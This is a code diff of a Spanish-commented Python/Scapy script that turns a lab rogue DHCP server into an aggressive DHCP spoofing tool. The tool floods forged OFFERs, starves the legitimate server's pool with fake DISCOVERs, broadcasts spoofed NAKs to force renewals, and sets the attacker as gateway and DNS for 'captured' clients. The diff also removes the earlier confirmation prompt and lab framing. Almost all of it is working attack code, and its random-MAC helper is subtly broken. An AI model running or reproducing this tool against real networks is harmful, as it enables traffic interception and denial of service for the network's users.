@@ -1,113 +1,145 @@
 #!/usr/bin/env python3
 """
-DHCP Spoofing - Servidor Rogue Funcional Corregido
+DHCP Spoofing Ultra-Rápido - Gana la carrera al servidor legítimo
 """
 
-import argparse
-import ipaddress
 import os
 import random
+import re
 import signal
 import subprocess
 import sys
 import time
-from scapy.all import BOOTP, DHCP, Ether, IP, UDP, conf, get_if_hwaddr, sendp, sniff
+from threading import Thread
+from scapy.all import (
+    BOOTP, DHCP, Ether, IP, UDP, conf,
+    get_if_hwaddr, sendp, sniff, srp
+)
 
 running = True
+leases = {}
+stats = {'wins': 0, 'losses': 0}
 
 
 def signal_handler(sig, frame):
     global running
     running = False
-    print("\n[!] Deteniendo servidor...")
 
 
 signal.signal(signal.SIGINT, signal_handler)
-signal.signal(signal.SIGTERM, signal_handler)
 
 
 def require_root():
     if os.geteuid() != 0:
-        print("[!] Ejecutar con sudo")
+        print("[!] Ejecutar como root")
         sys.exit(1)
 
 
 def run_cmd(cmd):
     try:
         return subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL).strip()
-    except Exception:
+    except:
         return ""
 
 
+def get_interface_ip(iface):
+    output = run_cmd(["ip", "-4", "addr", "show", iface])
+    match = re.search(r'inet\s+(\d+\.\d+\.\d+\.\d+)', output)
+    return match.group(1) if match else None
+
+
 def list_interfaces():
-    return [i for i in sorted(os.listdir("/sys/class/net")) if i != "lo"]
+    interfaces = []
+    for iface in sorted(os.listdir("/sys/class/net")):
+        if iface != "lo":
+            ip = get_interface_ip(iface)
+            interfaces.append({'name': iface, 'ip': ip})
+    return interfaces
 
 
-def get_ip_line(iface):
-    return run_cmd(["ip", "-br", "addr", "show", iface]) or iface
-
-
-def choose_interface(default="eth0"):
+def choose_interface():
     interfaces = list_interfaces()
-    if not interfaces:
-        print("[!] No se encontraron interfaces")
-        sys.exit(1)
-    
-    print("\n[+] Interfaces disponibles:\n")
+    print("\n[+] Interfaces disponibles:")
     for idx, iface in enumerate(interfaces, 1):
-        print(f"  {idx}. {get_ip_line(iface)}")
-    print("")
-    
-    if default not in interfaces:
-        default = interfaces[0]
-    
-    value = input(f"[?] Selecciona interfaz [Enter={default}]: ").strip()
-    
-    if value == "":
-        return default
-    if value.isdigit() and 1 <= int(value) <= len(interfaces):
-        return interfaces[int(value) - 1]
-    if value in interfaces:
-        return value
-    
-    print(f"[!] Interfaz inválida: {value}")
-    sys.exit(1)
+        ip_str = f"IP:{iface['ip']}" if iface['ip'] else "Sin IP"
+        print(f"  {idx}. {iface['name']:<10} {ip_str}")
+
+    while True:
+        choice = input("\n[?] Selecciona interfaz (número o nombre): ").strip()
+        if choice.isdigit():
+            idx = int(choice) - 1
+            if 0 <= idx < len(interfaces):
+                return interfaces[idx]
+        for iface in interfaces:
+            if iface['name'] == choice:
+                return iface
+        print("[!] Inválido")
 
 
-def valid_ip(value):
-    try:
-        ipaddress.ip_address(value)
-        return True
-    except:
-        return False
+def random_mac():
+    return "02:%02x:%02x:%02x:%02x:%02x:%02x" % (
+        random.randint(0,255), random.randint(0,255),
+        random.randint(0,255), random.randint(0,255),
+        random.randint(0,255), random.randint(0,255))
 
 
-def ip_to_int(ip):
-    return int(ipaddress.IPv4Address(ip))
+def mac_to_bytes(mac):
+    return bytes.fromhex(mac.replace(":", ""))
 
 
-def int_to_ip(value):
-    return str(ipaddress.IPv4Address(value))
+def flood_offers(iface, server_mac, server_ip, client_mac, xid, chaddr, pool):
+    """
+    Técnica 1: Flood de múltiples OFFERs consecutivos
+    Enviar 5-10 ofertas rápidamente aumenta probabilidad de ganar
+    """
+    for offered_ip in pool[:5]:  # Primeras 5 IPs del pool
+        if not running:
+            break
+
+        offer = (
+            Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
+            IP(src=server_ip, dst="255.255.255.255") /
+            UDP(sport=67, dport=68) /
+            BOOTP(op=2, htype=1, hlen=6, xid=xid, yiaddr=offered_ip,
+                  siaddr=server_ip, chaddr=chaddr) /
+            DHCP(options=[
+                ("message-type", "offer"),
+                ("server_id", server_ip),
+                ("lease_time", 3600),
+                ("subnet_mask", "255.255.255.240"),
+                ("router", server_ip),
+                ("name_server", server_ip),
+                ("broadcast_address", "14.2.0.175"),
+                "end"
+            ])
+        )
+
+        # Enviar sin delay entre ellos
+        sendp(offer, iface=iface, verbose=False)
+
+    print(f"    └─ Enviados 5 OFFERs rápidos a {client_mac}")
 
 
-def parse_pool(pool):
-    if "-" not in pool:
-        print("[!] Pool debe ser inicio-fin (ej: 192.168.1.100-192.168.1.200)")
-        sys.exit(1)
-    
-    start, end = pool.split("-", 1)
-    start, end = start.strip(), end.strip()
-    
-    if not valid_ip(start) or not valid_ip(end):
-        print("[!] IPs de pool inválidas")
-        sys.exit(1)
-    
-    start_int, end_int = ip_to_int(start), ip_to_int(end)
-    if start_int > end_int:
-        print("[!] IP inicio no puede ser mayor que IP fin")
-        sys.exit(1)
-    
-    return start_int, end_int
+def send_ack(server_mac, server_ip, client_mac, xid, chaddr, assigned_ip, iface):
+    """ACK optimizado"""
+    ack = (
+        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
+        IP(src=server_ip, dst="255.255.255.255") /
+        UDP(sport=67, dport=68) /
+        BOOTP(op=2, htype=1, hlen=6, xid=xid, yiaddr=assigned_ip,
+              siaddr=server_ip, chaddr=chaddr) /
+        DHCP(options=[
+            ("message-type", "ack"),
+            ("server_id", server_ip),
+            ("lease_time", 3600),
+            ("subnet_mask", "255.255.255.240"),
+            ("router", server_ip),
+            ("name_server", server_ip),
+            ("broadcast_address", "14.2.0.175"),
+            "end"
+        ])
+    )
+    sendp(ack, iface=iface, verbose=False)
 
 
 def get_dhcp_option(pkt, name):
@@ -119,256 +151,183 @@ def get_dhcp_option(pkt, name):
     return None
 
 
-def mac_to_clean(mac):
-    return mac.lower().replace(":", "").replace("-", "")
+def starve_legitimate_dhcp(iface, count=50):
+    """
+    Técnica 2: Agotar pool del servidor legítimo primero
+    """
+    print(f"\n[*] Fase 1: Agotando pool del servidor legítimo...")
+    print(f"    Enviando {count} solicitudes falsas...")
+
+    for i in range(count):
+        mac = random_mac()
+        xid = random.randint(1, 0xFFFFFFFF)
+        chaddr = mac_to_bytes(mac) + b'\x00' * 10
+
+        discover = (
+            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
+            IP(src="0.0.0.0", dst="255.255.255.255") /
+            UDP(sport=68, dport=67) /
+            BOOTP(chaddr=chaddr, xid=xid, flags=0x8000) /
+            DHCP(options=[("message-type", "discover"), "end"])
+        )
+
+        sendp(discover, iface=iface, verbose=False)
+
+        if i % 10 == 0:
+            print(f"    Progreso: {i}/{count}")
+
+        time.sleep(0.01)
+
+    print(f"[+] Starvation completado. Esperando 3 segundos...")
+    time.sleep(3)
 
 
-def ensure_bytes_chaddr(chaddr):
-    """Asegura que chaddr sea bytes de 16 bytes exactos"""
-    if isinstance(chaddr, str):
-        chaddr = bytes.fromhex(chaddr.replace(":", "").replace("-", ""))
-    if len(chaddr) < 16:
-        chaddr = chaddr + b'\x00' * (16 - len(chaddr))
-    return chaddr[:16]
+def force_renewal(iface, server_mac, server_ip):
+    """
+    Técnica 3: Forzar renovación enviando DHCP NAK spoofeado
+    Esto hace que los clientes reconvoquen DHCP inmediatamente
+    """
+    print(f"\n[*] Fase 2: Forzando renovaciones DHCP...")
+
+    # Enviar NAKs broadcast para forzar renovación
+    for _ in range(10):
+        nak = (
+            Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
+            IP(src=server_ip, dst="255.255.255.255") /
+            UDP(sport=67, dport=68) /
+            BOOTP(op=2, htype=1, hlen=6, xid=random.randint(1,0xFFFFFFFF)) /
+            DHCP(options=[
+                ("message-type", "nak"),
+                ("server_id", server_ip),
+                "end"
+            ])
+        )
+        sendp(nak, iface=iface, verbose=False)
+        time.sleep(0.1)
+
+    print(f"[+] NAKs enviados. Clientes deberían renovar ahora.")
 
 
-def next_pool_ip(state):
-    start, end = state["pool_start"], state["pool_end"]
-    
-    for _ in range(end - start + 1):
-        current = state["next_ip"]
-        if current > end:
-            current = start
-            state["next_ip"] = start
-        state["next_ip"] = current + 1
-        
-        ip = int_to_ip(current)
-        if ip not in state["excluded"] and ip not in state["used_ips"]:
-            state["used_ips"].add(ip)
-            return ip
-    
-    return None
+def handle_packet(pkt, server_mac, server_ip, pool, iface):
+    """Manejador ultra-rápido de paquetes"""
+    global stats
 
+    if DHCP not in pkt or BOOTP not in pkt:
+        return
 
-def get_lease(mac, state):
-    if mac in state["leases"]:
-        return state["leases"][mac]
-    
-    ip = next_pool_ip(state)
-    if ip:
-        state["leases"][mac] = ip
-    return ip
+    msg_type = get_dhcp_option(pkt, "message-type")
+    client_mac = pkt[Ether].src
+    xid = pkt[BOOTP].xid
+    chaddr = mac_to_bytes(client_mac) + b'\x00' * 10
 
+    # DISCOVER - Responder INMEDIATAMENTE con flood de ofertas
+    if msg_type == 1 or msg_type == "discover":
+        print(f"\n📥 DISCOVER de {client_mac}")
 
-def make_dhcp_packet(args, state, request_pkt, msg_type, yiaddr):
-    """Construye respuesta DHCP con formato correcto"""
-    client_mac = request_pkt[Ether].src
-    server_mac = state["server_mac"]
-    xid = request_pkt[BOOTP].xid
-    flags = request_pkt[BOOTP].flags
-    
-    # CORRECCIÓN: Asegurar chaddr de 16 bytes
-    chaddr = ensure_bytes_chaddr(request_pkt[BOOTP].chaddr)
-    
-    # Opciones DHCP
-    options = [
-        ("message-type", msg_type),
-        ("server_id", args.server_ip),
-        ("lease_time", args.lease_time),
-        ("renewal_time", int(args.lease_time * 0.5)),
-        ("rebinding_time", int(args.lease_time * 0.875)),
-        ("subnet_mask", args.subnet_mask),
-        ("router", args.gateway),
-        ("name_server", args.dns),
-        ("domain", args.domain),
-        "end"
-    ]
-    
-    pkt = (
-        Ether(src=server_mac, dst="ff:ff:ff:ff:ff:ff") /
-        IP(src=args.server_ip, dst="255.255.255.255") /
-        UDP(sport=67, dport=68) /
-        BOOTP(
-            op=2,           # BOOTREPLY
-            htype=1,        # Ethernet
-            hlen=6,         # MAC length
-            xid=xid,
-            flags=flags,
-            yiaddr=yiaddr,  # Your IP
-            siaddr=args.server_ip,
-            chaddr=chaddr   # CORRECCIÓN: 16 bytes exactos
-        ) /
-        DHCP(options=options)
-    )
-    
-    return pkt
+        # Técnica: Responder en thread separado para no bloquear
+        Thread(target=flood_offers, args=(
+            iface, server_mac, server_ip, client_mac, xid, chaddr, pool
+        ), daemon=True).start()
 
+        print(f"    └─ Flood de OFFERs iniciado...")
 
-def send_offer(args, state, pkt, offered_ip):
-    response = make_dhcp_packet(args, state, pkt, "offer", offered_ip)
-    sendp(response, iface=args.iface, verbose=False)
-    state["offers"] += 1
-    
-    print(f"📤 OFFER → {pkt[Ether].src} | IP: {offered_ip} | GW: {args.gateway}")
+    # REQUEST - Verificar si es para nosotros
+    elif msg_type == 3 or msg_type == "request":
+        server_id = get_dhcp_option(pkt, "server_id")
 
-
-def send_ack(args, state, pkt, assigned_ip):
-    response = make_dhcp_packet(args, state, pkt, "ack", assigned_ip)
-    sendp(response, iface=args.iface, verbose=False)
-    state["acks"] += 1
-    
-    print(f"📤 ACK   → {pkt[Ether].src} | IP: {assigned_ip} | GW: {args.gateway}")
-
-
-def handle_packet(args, state, pkt):
-    """Procesa paquetes DHCP entrantes"""
-    try:
-        if DHCP not in pkt or BOOTP not in pkt or Ether not in pkt:
-            return
-        
-        msg_type = get_dhcp_option(pkt, "message-type")
-        if msg_type is None:
-            return
-        
-        client_mac = pkt[Ether].src
-        clean_mac = mac_to_clean(client_mac)
-        
-        # DISCOVER
-        if msg_type == 1 or msg_type == "discover":
-            offered_ip = get_lease(clean_mac, state)
-            if offered_ip:
-                send_offer(args, state, pkt, offered_ip)
-        
-        # REQUEST
-        elif msg_type == 3 or msg_type == "request":
+        if server_id == server_ip:
+            # Es para nosotros! Enviar ACK inmediato
             requested_ip = get_dhcp_option(pkt, "requested_addr")
-            assigned_ip = state["leases"].get(clean_mac)
-            
-            # Si solicita IP específica y está en nuestro pool, respetarla
-            if requested_ip:
-                if isinstance(requested_ip, bytes):
-                    requested_ip = requested_ip.decode()
-                
-                req_int = ip_to_int(requested_ip)
-                if state["pool_start"] <= req_int <= state["pool_end"]:
-                    assigned_ip = requested_ip
-                    state["leases"][clean_mac] = assigned_ip
-                    state["used_ips"].add(assigned_ip)
-            
-            # Si no tiene lease, asignar nueva
-            if assigned_ip is None:
-                assigned_ip = get_lease(clean_mac, state)
-            
-            if assigned_ip:
-                send_ack(args, state, pkt, assigned_ip)
-                
-    except Exception as e:
-        print(f"[!] Error procesando paquete: {e}")
+            assigned_ip = requested_ip if requested_ip else pool[0]
 
+            send_ack(server_mac, server_ip, client_mac, xid, chaddr, assigned_ip, iface)
 
-def validate_args(args):
-    for field, name in [(args.server_ip, "server-ip"), (args.gateway, "gateway"), 
-                        (args.dns, "dns"), (args.subnet_mask, "subnet-mask")]:
-        if not valid_ip(field):
-            print(f"[!] {name} inválida: {field}")
-            sys.exit(1)
-    
-    args.pool_start, args.pool_end = parse_pool(args.pool)
-    
-    # Parsear IPs excluidas
-    excluded = set()
-    for ip in args.exclude.split(","):
-        ip = ip.strip()
-        if ip and valid_ip(ip):
-            excluded.add(ip)
-    args.excluded_set = excluded
+            if client_mac not in leases:
+                leases[client_mac] = assigned_ip
+                stats['wins'] += 1
+
+            print(f"✅ ACK enviado a {client_mac}")
+            print(f"   IP: {assigned_ip} | Total victorias: {stats['wins']}")
+        else:
+            # El cliente eligió al otro servidor
+            stats['losses'] += 1
+            print(f"❌ Cliente {client_mac} eligió servidor {server_id}")
 
 
 def main():
-    parser = argparse.ArgumentParser(description="DHCP Rogue Server - Lab")
-    parser.add_argument("-i", "--iface", default=None, help="Interfaz de red")
-    parser.add_argument("--server-ip", default="192.168.1.50", help="IP del servidor rogue")
-    parser.add_argument("--gateway", default="192.168.1.50", help="Gateway malicioso")
-    parser.add_argument("--dns", default="192.168.1.50", help="DNS malicioso")
-    parser.add_argument("--subnet-mask", default="255.255.255.0")
-    parser.add_argument("--pool", default="192.168.1.100-192.168.1.200", help="Rango de IPs")
-    parser.add_argument("--exclude", default="", help="IPs excluidas (separadas por coma)")
-    parser.add_argument("--lease-time", type=int, default=3600)
-    parser.add_argument("--domain", default="lab.local")
-    parser.add_argument("--yes", action="store_true", help="No pedir confirmación")
-    
-    args = parser.parse_args()
+    global running
+
     require_root()
-    
-    if args.iface is None:
-        args.iface = choose_interface("eth0")
-    
-    validate_args(args)
-    
-    try:
-        server_mac = get_if_hwaddr(args.iface)
-    except:
-        print(f"[!] No pude obtener MAC de {args.iface}")
-        sys.exit(1)
-    
-    conf.iface = args.iface
-    conf.verb = 0
-    
-    state = {
-        "server_mac": server_mac,
-        "pool_start": args.pool_start,
-        "pool_end": args.pool_end,
-        "next_ip": args.pool_start,
-        "excluded": args.excluded_set,
-        "leases": {},
-        "used_ips": set(),
-        "offers": 0,
-        "acks": 0
-    }
-    
-    print(f"""
-╔══════════════════════════════════════════════════════════════╗
-║                 DHCP ROGUE SERVER - LAB                       ║
-╠══════════════════════════════════════════════════════════════╣
-  Interfaz:      {args.iface}
-  MAC Server:   {server_mac}
-  Server IP:    {args.server_ip}
-  Pool:         {args.pool}
-  Excluidas:    {len(args.excluded_set)} IPs
-  Gateway:      {args.gateway}
-  DNS:          {args.dns}
-  Lease Time:   {args.lease_time}s
-╚══════════════════════════════════════════════════════════════╝
+
+    print("""
+╔══════════════════════════════════════════════════════════════════╗
+║     DHCP SPOOFING ULTRA-RÁPIDO - Gana la carrera al DHCP         ║
+╠══════════════════════════════════════════════════════════════════╣
+  Estrategias implementadas:
+  1. Flood de múltiples OFFERs (5 ofertas seguidas)
+  2. Starvation previo del pool legítimo (opcional)
+  3. Forzar renovaciones con NAKs (opcional)
+  4. Respuesta en thread separado (sin bloqueo)
+╚══════════════════════════════════════════════════════════════════╝
 """)
-    
-    if not args.yes:
-        confirm = input("[?] Presiona Enter para iniciar o 'n' para cancelar: ").strip().lower()
-        if confirm in ['n', 'no']:
-            print("[*] Cancelado")
-            sys.exit(0)
-    
-    print("[*] Servidor iniciado. Esperando solicitudes DHCP...\n")
-    
+
+    # Selección de interfaz
+    iface_info = choose_interface()
+    iface_name = iface_info['name']
+    server_ip = iface_info['ip']
+
+    if not server_ip:
+        print("[!] La interfaz no tiene IP")
+        sys.exit(1)
+
+    # Pool de IPs (excluyendo la del atacante)
+    last_octet = int(server_ip.split('.')[3])
+    pool = [f"14.2.0.{i}" for i in range(161, 175) if i != last_octet]
+
+    server_mac = get_if_hwaddr(iface_name)
+
+    conf.iface = iface_name
+    conf.verb = 0
+
+    print(f"\n[+] Configuración:")
+    print(f"    Interfaz: {iface_name}")
+    print(f"    Tu IP/GW: {server_ip}")
+    print(f"    Pool: {pool[0]} - {pool[-1]} ({len(pool)} IPs)")
+
+    # Opciones de ataque agresivo
+    print(f"\n[?] Opciones agresivas:")
+    starve = input("    1. Agotar pool del servidor legítimo primero? [s/N]: ").strip().lower()
+    force = input("    2. Forzar renovaciones DHCP? [s/N]: ").strip().lower()
+
+    if starve in ['s', 'si', 'y', 'yes']:
+        starve_legitimate_dhcp(iface_name, count=100)
+
+    if force in ['s', 'si', 'y', 'yes']:
+        force_renewal(iface_name, server_mac, server_ip)
+
+    print(f"\n[*] Iniciando servidor DHCP rogue...")
+    print(f"[*] Respondiendo con FLOOD de ofertas a cada DISCOVER")
+    print(f"[*] Presiona Ctrl+C para detener\n")
+
     try:
         sniff(
-            iface=args.iface,
+            iface=iface_name,
             filter="udp and (port 67 or port 68)",
-            store=False,
-            prn=lambda pkt: handle_packet(args, state, pkt),
+            prn=lambda pkt: handle_packet(pkt, server_mac, server_ip, pool, iface_name),
             stop_filter=lambda x: not running
         )
     except KeyboardInterrupt:
         pass
-    
-    print(f"""
-╔══════════════════════════════════════════════════════════════╗
-                         RESUMEN
-╠══════════════════════════════════════════════════════════════╣
-  OFFER enviados:  {state['offers']}
-  ACK enviados:    {state['acks']}
-  Leases activos:  {len(state['leases'])}
-╚══════════════════════════════════════════════════════════════╝
-""")
+
+    print(f"\n\n[+] Estadísticas finales:")
+    print(f"    Victorias: {stats['wins']}")
+    print(f"    Derrotas:  {stats['losses']}")
+    print(f"    Eficiencia: {stats['wins']/(stats['wins']+stats['losses'])*100:.1f}%" if (stats['wins']+stats['losses']) > 0 else "    N/A")
+
+    if leases:
+        print(f"\n[+] Clientes capturados ({len(leases)}):")
+        for mac, ip in sorted(leases.items()):
+            print(f"    {ip} → {mac}")
 
 
 if __name__ == "__main__":
